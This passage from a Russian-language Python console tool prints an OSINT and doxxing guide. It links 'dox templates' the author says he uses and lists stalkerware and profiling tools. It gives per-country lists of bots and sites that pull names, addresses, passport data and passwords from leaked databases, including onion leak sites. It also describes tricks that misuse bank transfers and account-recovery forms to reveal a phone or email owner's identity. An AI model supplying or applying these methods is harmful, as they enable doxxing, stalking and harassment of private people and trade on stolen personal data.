"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '57':
             print(Colorate.Vertical(Colors.cyan_to_green, """
---------------------------------------------------------------------------------------
OSINT: Если вы слышали это название, но задаетесь вопросом, что оно означает, OSINT расшифровывается как open source intelligence, что
означает любую информацию о человеке или организации, которая может быть законно получена из бесплатных общедоступных источников.
На практике это, как правило, означает информацию, найденную в Интернете, но технически любая общедоступная информация подпадает под
категорию OSINT, будь то книги или отчеты в публичной библиотеке, статьи в газете или заявления в
пресс-релизе.

OSINT также содержит информацию, которую можно найти на различных типах носителей. Хотя обычно мы думаем об этом как
под этот термин подпадает текстовая информация, содержащаяся в изображениях, видео, вебинарах, публичных выступлениях и конференциях.
                            
[>] 

МОШЕННИЧЕСТВО: Мошенничество (иногда пишется как Doxxing) - это акт раскрытия идентифицирующей информации о ком-либо в Интернете,
такой как его настоящее имя, домашний адрес, рабочее место, телефон, финансовые данные и другая личная информация. Затем эта информация
распространяется среди общественности — без разрешения жертвы.

Хакерские атаки могут варьироваться от относительно тривиальных, таких как поддельная регистрация по электронной почте или доставка пиццы, до гораздо более серьезных
опасные, такие как преследование семьи или работодателя, кража личных данных, угрозы или другие формы киберзапугивания
или даже личные домогательства.

                        
ШАБЛОНЫ DOX

1. https://www.klgrth.io/paste/ww573 - ПРОСТЫЕ
2. https://www.klgrth.io/paste/g4qw7 - То, что я обычно использую
3. https://www.klgrth.io/paste/k474q - ПРОСТЫЕ

Поиск по изображениям
Если у вас есть фотография, значок или аватар, вы можете выполнить обратный поиск изображений.
Например, если вы используете свой портрет в своем профиле на Facebook, вы можете проверить, не использовалась ли эта фотография в
другие веб-страницы, выполнив поиск по URL-адресу вашего значка. Чтобы узнать, каков URL-адрес вашего значка, щелкните правой кнопкой мыши на изображении
и выберите “Скопировать местоположение изображения”, затем вставьте URL-адрес в поисковую систему.

Поисковая система найдет все страницы, содержащие изображение, которое вы ищете. Существуют различные
поисковые системы, которые могут помочь вам в этом. Здесь мы приводим краткую информацию о некоторых из них. Для более
подробного сравнения их функций и получения дополнительной информации о том, как их использовать, пожалуйста, обратитесь к Руководству Bellingcat по
использованию обратного поиска изображений для проведения расследований.

Google – на сегодняшний день это самая популярная система поиска изображений в обратном порядке, но ее эффективность зависит от того, какой поиск
вы проводите. Она может выдать полезные результаты для наиболее явно украденных или популярных изображений, но для более
сложного поиска вам, вероятно, потребуется использовать более продвинутые поисковые системы.

Яндекс – Российский сайт Яндекс считается самой эффективной системой поиска изображений в обратном порядке, доступной в настоящее время. 
Помимо поиска фотографий, похожих на ту, на которой изображено лицо, Яндекс также будет искать
другие фотографии того же человека, определенные по сходству черт лица, которые, возможно, были сделаны
при разном освещении, цветах фона и в разных положениях. В то время как другие – зачастую более известные – поисковые системы, такие как Google
и Bing, могут просто искать другие фотографии, на которых изображен человек в похожей одежде и с общими чертами лица, Яндекс
будет искать эти совпадения, а также другие фотографии, на которых лица совпадают. Если вам нужна помощь с русскоязычным пользовательским
интерфейсом, пожалуйста, обратитесь к Руководству Bellingcat по использованию обратного поиска изображений для расследований, которое содержит
основные пошаговые инструкции на английском языке.

“Визуальный поиск” Bing – Bing очень прост в использовании и предлагает несколько интересных функций, которых нет нигде. 
Например, он позволяет обрезать фотографию, чтобы сфокусироваться на определенном элементе, и исключить из поиска любой другой
элемент, который может оказаться неуместным.

TinEye – Четвертая поисковая система, которую также можно использовать для обратного поиска изображений, - это TinEye, но этот сайт
специализируется на нарушениях прав интеллектуальной собственности и специально ищет точные копии изображений.

Наиболее распространенные инструменты
Spokeo – система поиска людей и бесплатные "белые страницы", которая позволяет найти телефон, адрес, электронную почту и
фотографии. Найдите людей по имени, электронной почте, адресу и телефону бесплатно.

theHarvester – Этот инструмент предназначен для того, чтобы помочь специалистам по тестированию на проникновение на ранних этапах тестирования на проникновение
, чтобы понять, какое влияние оказывают пользователи в Интернете. Он также полезен всем, кто хочет знать, что злоумышленник
может увидеть об их организации.

Foca – FOCA 3.2 Free - это инструмент для снятия отпечатков пальцев и сбора информации для пентестеров. Он выполняет поиск серверов,
домены, URL-адреса и общедоступные документы и распечатывать полученную информацию в виде сетевого дерева. Программа также выполняет поиск
утечек данных, таких как метаданные, список каталогов, незащищенные методы HTTP, файлы .listing или .DS_Store, активированный кэш в DNS
Services и т.д…

Shodan – Поиск компьютеров на основе программного обеспечения, географии, операционной системы, IP-адреса и многого другого

Maltego – Maltego - это уникальная платформа, разработанная для предоставления четкой картины угроз среде, которой
владеет и управляет организация. Уникальное преимущество Maltego заключается в демонстрации сложности и серьезности одиночных
точки сбоя, а также доверительные отношения, существующие в настоящее время в рамках вашей инфраструктуры.

Deep Magic – Поиск записей DNS и других интересных функций.

Jigsaw – это инструмент поиска, используемый специалистами по продажам, маркетологами и рекрутерами для получения свежих и точных
потенциальных клиентов и контактной информации о бизнесе.

Hoovers – Поиск по более чем 85 миллионам компаний в 900 отраслевых сегментах; Отчеты Hoover's Reports - это удобные для чтения отчеты о ключевых
конкурентах, финансовых показателях и руководителях

Market Visual – Поиск специалистов по названию, компании или должности

FoxOne Scanner – Неинвазивный и необнаруживаемый сканер для разведки веб-серверов

Creepy – это приложение, которое позволяет собирать информацию о пользователях, связанную с геолокацией, с
платформ социальных сетей и сервисов размещения изображений.

Записанное будущее – Инструменты интеллектуального анализа записанного будущего помогают аналитикам понять тенденции в области больших данных и предвидеть
, что может произойти в будущем. Новаторские алгоритмы извлекают временные и прогностические сигналы из неструктурированного
текста. Записанное будущее систематизирует эту информацию, отображает результаты на интерактивных графиках времени, визуализирует прошлое
отслеживайте тенденции и составляйте карты будущих событий, обеспечивая при этом прослеживаемость до источников. 
Recorded Future предлагает инновационные, масштабируемые решения - от OSINT до секретных данных.

MobiStealth – Программное обеспечение для слежки за мобильными телефонами Mobistealth позволяет вам получать ответы, которые вы действительно хотите и заслуживаете.
Наше программное обеспечение для слежки за мобильными телефонами, включающее множество расширенных функций наблюдения, тайно отслеживает все
действия с мобильного телефона и отправляет информацию обратно в вашу учетную запись пользователя Mobistealth.

Snoopy – Snoopy - это распределенная платформа для отслеживания и профилирования

Stalker – STALKER - это инструмент для восстановления всего перехваченного трафика (как проводного, так и беспроводного) и анализа всей
“интересной” информации, раскрываемой пользователями.  Он не ограничивается простым получением паролей и электронных писем из воздуха, поскольку
пытается создать полный профиль вашей цели (ов).  Вы бы удивились, узнав, сколько данных можно собрать за 15
минут.

LinkedIn Maps – Ваш профессиональный мир. Визуализированный. Составьте карту своей профессиональной сети, чтобы понять взаимоотношения
между вами и вашими знакомыми

LittleSis – это бесплатная база данных о том, кто знает, кто занимает высокие посты в бизнесе и правительстве.

Entity Cube – EntityCube - это исследовательский прототип для изучения технологий поиска на уровне объектов, который автоматически
обобщает веб-данные для объектов (таких как люди, местоположения и организации) со скромным присутствием в Сети.

TinEye – TinEye - это система обратного поиска изображений, которая в настоящее время находится в стадии бета-тестирования. Задайте ему изображение, и оно сообщит вам, где это
изображение появляется в Интернете.

Google Hacking DB – Поисковый запрос Google Fu для поиска секретного соуса
ServerSniff – ServerSniff.net – Ваш бесплатный “швейцарский армейский нож” для создания сетей, проверки серверов и маршрутизации с множеством
маленьких игрушек и инструментов для администраторов, веб-мастеров, разработчиков, опытных пользователей и тех, кто заботится о безопасности.

MyIPNeighbours – My IP Neighbors позволяет вам узнать, размещены ли какие-либо другие веб-сайты (“виртуальные хосты”) на данном веб
-сервере.

Social Mention – это поисковая система в социальных сетях, которая выполняет поиск пользовательского контента, такого как блоги,
комментарии, закладки, события, новости, видео и многое другое

Стеклянная дверь – найдите работу, а затем загляните внутрь. Зарплаты в компаниях, отзывы, вопросы для собеседования и многое другое – все
это анонимно публикуется сотрудниками и соискателями.

NameCHK – Проверьте, доступно ли желаемое вами имя пользователя или URL-адрес vanity по-прежнему в десятках популярных социальных сетей.
Создание сетей и сайтов социальных закладок.

Scythe – возможность проверить ряд адресов электронной почты (или имен учетных записей) на различных веб-сайтах (например, в социальных
сетях, на платформах для ведения блогов и т.д.), чтобы определить, где у этих целевых пользователей есть активные учетные записи.

Recon-NG – Отличный скрипт на Python, который автоматизирует поиск в LinkedIn, Jigsaw, Shodan и некоторых поисковых системах.

Pushpin – Потрясающий маленький скрипт на Python, который будет идентифицировать каждый твит, мерцающую картинку и видео на Youtube в пределах
определенного географического адреса.

Silobreaker – корпоративная семантическая поисковая система, позволяющая виртуализировать данные, проводить аналитику и изучать ключевые данные.

Google Trends – Смотрите, какие популярные тематические разделы ищут пользователи. Это поможет расширить
область поиска.

Google Alerts – Оповещения Google - это обновления по электронной почте последних релевантных результатов Google (веб-страницы, новости и т.д.) на основе ваших
запросов.

Addict-o-matic – Небольшой поисковый агрегатор. Позволяет ввести поисковый запрос и создать страницу на основе поисковых систем и
сайтов социальных сетей.

PasteLert – это простая система поиска pastebin.com и настройки оповещений (например, Google alerts) для pastebi.com
записи. Это означает, что вы будете автоматически получать электронное письмо всякий раз, когда ваши термины будут найдены в новых
записях pastebin!

Currently – Поисковая система в реальном времени для социальных сетей.

Проверьте имена пользователей – проверьте наличие имен пользователей на 160 сайтах социальных сетей.
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '58':
             print(Colorate.Vertical(Colors.cyan_to_green, """
-------------------------------------------
Поиск по номеру телефона любой страны
-------------------------------------------
1. PhoneInfoga (https://demo.phoneinfoga.crvx.fr/#/) — определят тип номера, город, дает дорки Google
2. numberway.com — найдет телефонный справочник
3. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатный период 14 дней для новых аккаунтов
4. @GetFb_bot — находит аккаунт Facebook
5. smsc.ru (https://smsc.ru/testhlr /) — статус активности телефона
6. Ignorant (https://github.com/megadose/ignorant) (t) — находит к какому сайту привязан номер телефона
7. @clerkinfobot — находит объявления и как записан номер телефона в контактах, берет данные из приложения getcontact
8. tools.whoisxmlapi.com (https://tools.whoisxmlapi.com/reverse-whois-search) (r) — выявляет домены веб-сайтов зарегистрированые на номер телефона
9. vedbex.com (https://www.vedbex.com/tools/phone2skype) — найдет аккаунт Skype
10. aihitdata.com (r) — найдет компании по всему миру где указан телефон, откройте вкладку “More Fields”
11. sync.me (r) — покажет имя из контактов и уровень спама
12. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым номером телефона
13. NumBuster (https://play.google.com/store/apps/details?id=com.numbuster.android) (a, r) — Android приложение покажет как записан номер телефона в контактах
14. revealname.com — выдаст имя владельца телефона, название операра связи
15. Truecaller.com (r) — покажет как записан номер телефона в контактах
16. @LeakCheckBot — покажет на каком сайте утёк телефон, бот принимает телефон только в виде цифр, без знаков плюс и т.п.
17. @getcontact_real_bot — покажет как записан номер телефона в контактной книжке
18. whoseno.com — отобразит имя
19. leakedsource.ru — покажет в каких базах замечен телефон, даст домен и дату утечки
20. Intelx.io — найдёт упоминание номера телефона в утечках, даст имя файла и источника, вводите номер телефона во всех возможных форматах, с плюсом и без, с дефисом или скобками, и без них
21. @hey_i_see_you_bot (r) — находит аккаунт ВК, Instagram, Facebook, LinkedIn, Twitter, телефоны и почту
22. @QuickOSINT_Robot — найдет оператора, email, адрес, как записан в контактах и многое другое, всего 3 бесплатных запроса для новых аккаунтов
23. @PhoneLeaks_bot — поиск в утечках, даст название источника слива
24. @n3fm4xw2rwbot — найдет возможные имена, адрес, email, телефоны, ВК, пароли, авто
25. Fuck-Facebook (http://4wbwa6vcpvcr3vvf4qkhppgy56urmjcj2vagu2iqgp3z656xcmfdbiqd.onion.ws/) — найдет аккаунт Facebook в глобальной утечке, нужно пройти капчу перед поиском
26. @The_New_Get_Contact_Bot — найдет имя и как записан телефон в контактах
27. @GetOKbot — найдет профиль в Одноклассниках и даст ссылку на него
28. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, аккаунты, адреса и прочее, для поиска подключите свой тг-бот
29. seon.io (r) — найдет аккаунты Skype, Viber, WhatsApp, Microsoft, проверит где зарегистрирован
30. emobiletracker.com — выдаст имя владельца телефона
31. @safe_search_bot — в утечках находит адреса, телефоны почты
-------------------------------------------
Поиск по номеру телефона Украины
-------------------------------------------
1. @OTcIa6RB_InfoB_Bot — клон ИнфоБазы, бесплатно найдет полное имя или его часть
2. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, большая база контактов, для поиска подключи свой тг-бот
3. spravochnik109.link (https://spravochnik109.link/ukraina) — поиск по городскому номеру телефона, найдет ФИО и адрес
4. @people_base_bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки
5. searchyellowdirectory.com (https://www.searchyellowdirectory.com/reverse-phone/380/) — определит к какой области Украины принадлежит номер телефона
6. m.ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
7. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей
8. rol-x.ru (https://rol-x.ru/searh_by_phone.aspx) — найдет объявления на OLX
9. @ce_poshuk_bot — даст ФИО, адрес, ИНН, другие номера телефонов
10. @olx_phone_bot (r) — найдет объявления на OLX, при регистрации можно отправить любой контакт боту
11. @poiskorRobot — найдет досье, данные паспорта, адрес, фото и автомобили
-------------------------------------------
Поиск по номеру телефона Бразилии
-------------------------------------------
1. sistemas.anatel.gov.br (http://sistemas.anatel.gov.br/sgmu/fiqueligado/tups.asp) — если номер телефона от таксофона, то найдет его на карте, время его работы, и прочее
2. telenumeros.com — найдет номер телефона, адрес, и полное имя
-------------------------------------------
Поиск по номеру телефона Венгрии
-------------------------------------------
1. telekom.hu (https://www.telekom.hu/lakossagi/tudakozo) — найдет ФИО и адрес проживания
-------------------------------------------
Для номера телефона Австралии
-------------------------------------------
1. personlookup.com.au — найдет имя и адрес
-------------------------------------------
Для номера телефона Казахстана
-------------------------------------------
1. truecaller.com (r) — телефонная книга, найдет имя и оператора телефона
2. fa-fa.kz (https://fa-fa.kz/search_ip_too/) — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд
3. spravochnik109.link (https://spravochnik109.link/kazahstan) — поиск по городскому номеру телефона, найдет ФИО и адрес
4. @get_kolesa_bot (r) — найдет объявления на колеса.кз
5. m.ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
6. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей
7. @OffThisContactBot — поиск в утечках, ищет как записан номер в контактах, большая база контактов, бесплатно подключите свой бот
8. @Getcontact_Officialbot (r) — найдет как записан контакт, получает данные из приложения GetContact
------------------------------------------
Поиск по номеру телефона Белоруссии
------------------------------------------
1. @OffThisContactBot — найдет как записан номер в контактах, дает результаты что и getcontact
2. spravochnik109.link (https://spravochnik109.link/byelarus) — поиск по городскому номеру телефона, найдет ФИО и адрес
3. @Informator_BelBot — найдёт объявления авто на Onliner
4. m.ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
5. smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей
6. @Getcontact_Officialbot (r) — найдет как записан контакт, получает данные из приложения GetContact
------------------------------------------
Поиск по номеру телефона Вьетнама
------------------------------------------
1. Установите приложение zalo (https://play.google.com/store/apps/details?id=com.zing.zalo) и через восстановление пароля найдется имя и фото аккаунта
------------------------------------------
Поиск по номеру телефона Германии
------------------------------------------
1. www.herold.at (https://www.herold.at/telefonbuch/) — найдет ФИО и адрес владельца 
2. www.telefonabc.at — выдаст ФИО
-------------------------------------------
Поиск по номеру телефона Гонконга
-------------------------------------------
1. @bailansgbot — выдаст имя, аккаунт QQ, Weibo, и прочее
-------------------------------------------
Поиск по номеру телефона Дании
-------------------------------------------
1. statstidende.dk (https://statstidende.dk/messages) — поиск в юридических документах, найдет данные о смене жительства, некрологи много всего полезного
2. datacvr.virk.dk (https://datacvr.virk.dk/data/) — поиск в сведениях о зарегистрированных предпринимателях и компаниях
3. krak.dk (https://www.krak.dk/) —найдет ФИО, местоположение на карте и фото дома.
-------------------------------------------
Поиск по номеру телефона Италии
-------------------------------------------
1. paginebianche.it (https://www.paginebianche.it/) — найдет ФИО и адрес
-------------------------------------------
Поиск по номеру телефона Исландии
-------------------------------------------
1. ja.is — найдет данные людей и компаний
-------------------------------------------
Поиск по номеру телефона Испании
-------------------------------------------
1. numeracionyoperadores.cnmc.es (https://numeracionyoperadores.cnmc.es/portabilidad/movil) — найдет название оператора связи
2. @BaseFace_Bot — найдёт в утечке Facebook ссылку на аккаунт
3. listaspam.com — найдёт жалобы от пользователей, рейтинг доверия
Дополнительные методы

Найти часть имени владельца телефона

[1] Сделайте попытку перевода через систему Bizum (https://www.bullfrag.com/are-there-differences-between-making-a-bizum-and-a-bank-transfer/) в приложении испанского банка
-------------------------------------------
Поиск по номеру телефона Индии
-------------------------------------------
1. Mi Airit (https://play.google.com/store/apps/details?id=com.app.airit) (a) — популярное Android приложении в Индии, после 
2. indiaonapage.com (http://www.indiaonapage.com/mobilenumbertrace) — покажет оператора связи и возможный город
-------------------------------------------
Поиск по номеру телефона Канады
-------------------------------------------
1. www.canada411.ca (https://www.canada411.ca/search/) — возраст, ФИО, адрес проживания и другое
-------------------------------------------
Поиск по номеру телефона Киргизии
-------------------------------------------
1. m.ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
2. @OffThisContactBot — ищет как записан номер в контактах, большая база контактов
-------------------------------------------
Поиск по номеру телефона Китая
-------------------------------------------
1. @SGKMainBot — ищет ID аккаунта QQ, Weibo
2. @DATA_007bot — выдаст аккаунт QQ, телефон вводить без +83
3. qcc.com — найдет компанию
4. @bailansgbot — выдаст имя, аккаунт QQ, Weibo, и прочее
-------------------------------------------
Поиск по номеру телефона Кубы
-------------------------------------------
1. @ETECSABD_bot — найдет ФИО, дату рождения, адрес проживания
2. @directorio_etecsa_bot — найдет ФИО, дату рождения, адрес проживания
3. directorioetecsa.com — найдет ФИО, дату рождения, адрес проживания
-------------------------------------------
Поиск по номеру телефона Латвии , Молдавии
-------------------------------------------
1. spravochnik109.link (https://spravochnik109.link/latviya) — поиск по городскому номеру телефона, найдет ФИО и адрес
-------------------------------------------
Поиск по номеру Нидерландов
-------------------------------------------
1. crdc.be (http://crdc.be/crdcNLI/BrowserDefault.aspx?tabid=265) — найдет текущего оператора связи
2. acm.nl (https://www.acm.nl/nl/onderwerpen/telecommunicatie/telefoonnummers/nummers-doorzoeken) — дает название компании владеющая номером
-------------------------------------------
Поиск по номеру телефона Норвегии
-------------------------------------------
1. gulesider.no — даст ФИО, местоположение на карте и фото дома
2. datacvr.virk.dk (https://datacvr.virk.dk/data/) — поиск в сведениях о зарегистрированных предпринимателях и компаниях
-------------------------------------------
Поиск по номеру телефона Польши
-------------------------------------------
1. ktodzvonil.com — публичные отзывы, рейтинг
2. ktoto.info — публичные отзывы, рейтинг
3. bip.uke.gov.pl (https://bip.uke.gov.pl/wyszukiwarka-rejestr-premium) — найдет адрес компании, название услуги
-------------------------------------------
Поиск по номеру телефона Приднестровье
-------------------------------------------

-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------
Найти ФИО владельца телефона

[1] Заходим в приложение Сбербанк Онлайн и переходим в "Платежи-За рубеж-По номеру телефона-Приднестровье"
[2] Вводим номер телефона в международном формате с кодом страны +373
[3] Выбираем банк
[4] Сумму вписываем 1 рубль (на момент написания комиссия 30 рублей)
[5] Если клиент банка по номеру телефона найден, то откроется окно подтверждения операции где ФИО, и 4 последние цифры карты получателя
-------------------------------------------
Поиск по номеру телефона Румынии 
-------------------------------------------
1. www.carte-telefoane.info — найдет ФИО, контакты, адрес
-------------------------------------------
Поиск по номеру телефона США
-------------------------------------------
1. spiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию
2. zabasearch.com — найдет имя, адрес, и многое другое
3. truecaller.com (r) — телефонная книга, найдет имя и оператора телефона
4. cyberbackgroundchecks.com (https://www.cyberbackgroundchecks.com/phone) — найдет все данные гражданина США, вход на сайт разрешен только с IP адреса США
5. melissa.com (https://www.melissa.com/v2/lookups/personator) — найдет ФИО, дату рождения, адрес проживания, этнос и прочее
6. apeiron.io (http://apeiron.io/cnam) — найдет имя владельца телефона
7. oldphonebook.com — найдет адрес и ФИО, записи 20-летней давности
8. anywho.com — найдет адрес где проживает владелец телефона
9. spydialer.com — найдет имя владельца телефона, город и штат проживания
10. smartbackgroundchecks.com — дает адреса, телефоны, биографию, семью, недвижимость, образование, почту, и прочее
Для части номера телефона США

1. martinvigo.com (https://www.martinvigo.com/tools/phonerator/) — проверит все комбинации номера телефона с неизвестной частью и выдаст только существующие номера
-------------------------------------------
Поиск по номеру телефона Франции
-------------------------------------------
1. www.118712.fr (https://www.118712.fr/annuaire-inverse-gratuit.html) — имя и адрес владельца номера телефона
2. www.pagesjaunes.fr — найдет номер ФИО и адрес проживания, введите телефон в первое поле
-------------------------------------------
Поиск по номеру телефона Швеции
-------------------------------------------
1. eniro.se (https://www.eniro.se/) — найдет ФИО, местоположение на карте и фото дома
2. datacvr.virk.dk (https://datacvr.virk.dk/data/) — поиск в сведениях о зарегистрированных предпринимателях и компаниях
3. upplysning.se (https://www.upplysning.se/) — контактные данные людей и компаний
4. mrkoll.se — найдет дату рождения, адрес, ФИО, соседей, номер социального страхования, номера телефонов, корпоративное участие, примерный доход, история изменений ФИО
-------------------------------------------
Поиск по номеру телефона Швейцарии⁣⁣
-------------------------------------------
1. local.ch (https://www.local.ch/en/tel) — поиск в реестре бизнесов, найдет сайт, адрес, фото
2. tel.search.ch — поиск в реестре бизнесов, найдет сайт, адрес, фото
-------------------------------------------
Поиск по номеру телефона Эстонии
-------------------------------------------
1. teatmik.ee (https://www.teatmik.ee/en/advancedsearch/contact) — поиск в базе организаций, ищет номер в контактах
-------------------------------------------
Поиск по номеру телефона Южной Кореи
-------------------------------------------
1. 114.co.kr — покажет адрес компании
2. kakaocorp.com (r) — создайте контакт и найдёте аккаунт в приложении
-------------------------------------------
Поиск по номеру телефона Японии
-------------------------------------------
1. www.jpnumber.com — найдет отзывы, провайдера, область, возможно ФИО владельца

Инструменты
-------------------------------------------
1. globfone.com (https://globfone.com/call-phone/) — бесплатные анонимные звонки на любой номер телефона
-------------------------------------------
Дополнительные методы
1. Оставьте только цифры у номера телефона и добавьте к нему @yandex.ru а потом используйте методы для Яндекс почты - /yandex
-------------------------------------------
Поиск по серийному номеру техники
-------------------------------------------
1. warrantycheck.epson.eu — техника бренда Epson, даст номер модели, номер материала
2. dysonseriallookup.com (http://dysonseriallookup.com/BedBathBeyond) — техника бренда Dyson, даст дату поставки и продавца
3. wwwp.medtronic.com (http://wwwp.medtronic.com/productperformance/serialLookup.html?serialNumber) — техника бренда Medtronic, выдает модель и тип медицинского оборудования
4. www.bobswatches.com (https://www.bobswatches.com/rolex-serial-numbers) — по серийному номеру часов Rolex выдает год производства
5. pcsupport.lenovo.com (https://pcsupport.lenovo.com/us/en/warrantylookup#/) — техника бренда Lenovo, выдает модель, а если залогиниться то и информацию о гарантии
6. www.imei.info (https://www.imei.info/apple-sn-check/) — техника бренда Apple, выдет модель, цвет, объем накопителя, время изготовления, место производства
7. www.vega.com (https://www.vega.com/en/products/serialnumber-search) — техника бренда Vega, различные датчики и системы контроля систем водоснабжения, отопления и прочего связанного с ЖКХ, даст подробную информацию о модели, дате поставки и дате тестирования
-------------------------------------------
Поиск по IMEI
-------------------------------------------
https://t.me/QuickOSINT_Robot - много че найдет
http://checkmi.info/ - Страна регистрации mi , половина майла, половина номера
https://xinit.ru/imei/ - Показывает характеристики устройства
https://www.imeipro.info/check_imei_iphone.html - показывает характеристики устройства


 Поиск по Email адресу любых почтовых сервисов

1. haveibeenpwned.com — проверка почты в слитых базах
2. emailrep.io — найдет на каких сайтах был зарегистрирован аккаунт использующий определенную почту
3. dehashed.com (r) — проверка почты в слитых базах
4. intelx.io — находит упоминание почты в архиве утечек, Tor, I2P и в крупных базах
5. @OTcIa6RB_InfoB_Bot — клон ИнфоБазы, бесплатно найдет часть ФИО и телефона гражданина Украины
6. leakedsource.ru — покажет в каких базах слита почта
7. mostwantedhf.info — найдет аккаунт skype
8. email2phonenumber (https://github.com/martinvigo/email2phonenumber) (t) — автоматически собирает данные со страниц восстановления аккаунта, и находит номер телефона
9. spiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию
10. @last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка
11. AVinfoBot (https://avclick.me/v/AVinfoBot) (r) — найдет аккаунт в ВК
12. identificator.space (https://identificator.space/search) (r) — найдет аккаунт Skype, Duolingo, Google, где регистрирован, авторизация без подтверждения
13. ГлазБога.com (r) — найдет фото из аккаунтов пользователя 
14. cyberbackgroundchecks.com (http://www.cyberbackgroundchecks.com/email) — найдет все данные гражданина США, вход на сайт разрешен только с IP адреса США
15. holehe (https://github.com/megadose/holehe) (t) — инструмент проверяет аккаунты каких сайтов зарегистрированы на искомый email адрес, поиск по 30 источникам
16. tools.epieos.com — найдет Google ID, даст ссылки на профиль в Google карты, альбомы и календарь, найдет к каким сайтам привязана почта, профиль LinkedIn
18. rocketreach.co (r) — выдает имя, профили в социальных сетях, почты, часть телефона, и прочее
19. m.ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
20. avatarapi.com — найдет аватарку из множества источников
21. @SovaAppBot — найдет к каким сайтам привязана почта, результаты могут отличаться от аналогичных инструментов
22. vedbex.com (https://www.vedbex.com/tools/email2skype) — найдет аккаунт Skype
23. odyssey-search.info (r) — персональные данные гражданина России, Украины, автомобили, документы, аккаунты с социальных сетях, зарегистрироваться можно на имя любой существующий компании
24. tools.whoisxmlapi.com (https://tools.whoisxmlapi.com/reverse-whois-search#captcha=05807042174) (r) — найдет домены сайтов, поиск в истории whois
25. @LeakCheckBot — покажет на каких сайтах утекли пароли
26. @a11_1n_bot (r) — выдаст ссылку на профиль Facebook
27. aihitdata.com (r) — ищет почту в контактах компаний по всему миру, откройте на сайте вкладку “More Fields”
28. melissa.com (https://www.melissa.com/v2/lookups/personator) — найдет ФИО, дату рождения, адрес проживания, этнос и прочее гражданина США
29. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым email
30. whoxy.com (https://www.whoxy.com/reverse-whois/) — найдет домены сайтов, поиск в истории whois
31. smartsearchbot.com — бот выдает ФИО, дату рождения, адрес, телефон и прочее, бесплатный поиск не доступен для новых пользователей
32. en.gravatar.com (http://en.gravatar.com/site/check/) — выдает аватарку аккаунта Gravatar
33. ccjkm4pwid.onion.ws (http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion.ws/deepsearch) (r) —  найдет логин, пароль, источник утечки
34. spydialer.com — находит имя владельца почты
35. @ce_poshuk_bot — найдет ФИО, дату рождения, телефоны гражданина Украины
36. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатно 14 дней для новых аккаунтов
37. @QuickOSINT_Robot — найдет пароли, соц. сети, логины, телефоны и многое другое, всего 3 бесплатных запроса для новых аккаунтов
38. x-ray.to (https://x-ray.to/ru-search) (r) — поиск в русском сегменте утечек, найдет номер телефона, социальные сети, больше адресов почт, иногда работает только через VPN
39. @probei_ru_bot — найдет имя, номер телефона, дату рождения
40. community.riskiq.com (r) — найдет сайты и домены у которых в whois искомый email адрес
41. @OffThisContactBot — поиск в утечках, ищет имена, адреса, иелефоны, большая база, бесплатно подключите свой бот
42. 2ip.ru (https://2ip.ru/domain-list-by-email/) — найдет доменные имена сайтов, в whois которых, есть запись с искомым email адресом
43. @n3fm4xw2rwbot — найдет возможные имена, адрес, email, телефоны, ВК, пароли, авто
44. @GetOKbot — найдет профиль в Одноклассниках и даст ссылку на него
45. SaveRuData (https://data.intelx.io/saverudata/) — покажет из утечек полный адрес, имя, все из сервиса Яндекс Еда, СДЕК, аккаунт ВК, траты на еду за 6 месяцев
46. @Zernerda_bot — ищет в двухсот слитых базах, находит адреса, имена, аккаунты и много другого, бесплатный поиск после первого запуска бота
47. @declassified_bot — телефон, имена, возможные пароли
48. scamsearch.io (http://scamsearch.io/#/search.php?f=1&hover_cle=yes&fill=0329976453&type=full-search) — реестр мошенников, найдет bitcoin адрес, причину внесения в реестр, номер телефона, дату и прочее
49. seon.io (r) — найдет аккаунты LinkedIn, Skype, Foursquare, проверит где зарегистрирован, в каких утечках замечена почта
50. @safe_search_bot — в утечках находит адреса, телефоны, почты

-------------------------------------------
Поиск через URL
-------------------------------------------

1. https://my.mail.ru/SITE/LOGIN — поиск аккаунта на Мой Мир, замените LOGIN на email адрес без @SITE.COM а SITE на тот сайт который указан в email адресе после "@". Например из maria@web.de в https://my.mail.ru/web.de/maria/
2. https://filin.mail.ru/pic?email=LOGIN@site.com — картинка аккаунта на mail.ru, замените LOGIN@site.com на email адрес
3. https://myspace.com/search/people?q=LOGIN@site.com — аккаунт на MySpace, любой аккаунт может привязать любую почту без подтверждения, замените LOGIN@site.com на email адрес
-------------------------------------------
LinkedIn по адресу e-mail
-------------------------------------------
[1] Откройте этот URL-адрес (https://outlook.live.com/people/0/) и войдите под учетной записью Майкрософт
